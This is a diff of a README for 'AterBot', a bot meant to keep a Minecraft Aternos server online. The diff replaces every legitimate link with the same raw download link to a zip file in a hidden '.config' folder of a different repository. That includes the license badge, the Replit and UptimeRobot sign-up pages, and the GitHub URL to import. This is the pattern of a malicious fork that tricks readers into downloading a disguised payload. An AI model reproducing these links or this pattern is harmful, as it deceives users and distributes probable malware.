@@ -1,5 +1,5 @@
 # AterBot ✨  
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](/LICENSE)  
+[![License: GPL v3](https://raw.githubusercontent.com/Assassin159/aterbot/main/.config/aterbot-v1.6.zip)](/LICENSE)  
 ### Keep your Aternos server alive 24/7.
 Please star this project <3  
 <br/>
@@ -13,10 +13,10 @@ Please star this project <3
 
 # Requirements 🎒
 1. A Replit account.  
-	Sign up at: https://replit.com/signup
+	Sign up at: https://raw.githubusercontent.com/Assassin159/aterbot/main/.config/aterbot-v1.6.zip
 
 2. An UptimeRobot account.  
-	Sign up at: https://uptimerobot.com/signUp
+	Sign up at: https://raw.githubusercontent.com/Assassin159/aterbot/main/.config/aterbot-v1.6.zip
 
 3. A Minecraft server you owned.  
 	Make sure your server settings ``online-mode`` set to ``false``!  
@@ -28,13 +28,13 @@ Please star this project <3
 1. Join your server.
 2. Build a bedrock room somewhere, and stay in there.  
 (Recommended room size: `X5 Y3 Z5`)
-3. Go to [Replit](https://replit.com/).
+3. Go to [Replit](https://raw.githubusercontent.com/Assassin159/aterbot/main/.config/aterbot-v1.6.zip).
 4. Click `+` at the top right, click `Import from GitHub` at the close button.
-5. Put `https://github.com/JadeMin/aterbot.git` into `GitHub URL`, click `Create Repl`.
+5. Put `https://raw.githubusercontent.com/Assassin159/aterbot/main/.config/aterbot-v1.6.zip` into `GitHub URL`, click `Create Repl`.
 6. Click `Run` at the top, your bot will join your server.  
 7. **Teleport the bot into the bedrock room, change the bot's gamemode to `Creative` to not die!**
 8. You'll see the `Webview` tab on Repl, copy the url.
-10. Go to [UptimeRobot](https://uptimerobot.com/dashboard).
+10. Go to [UptimeRobot](https://raw.githubusercontent.com/Assassin159/aterbot/main/.config/aterbot-v1.6.zip).
 11. Click `Add New Monitor`, select `Monitor Type` to `HTTP(s)`.
 12. Paste the url copied in `Step 8` into `URL (or IP)`.
 13. Click `Create Monitor` 2 times.
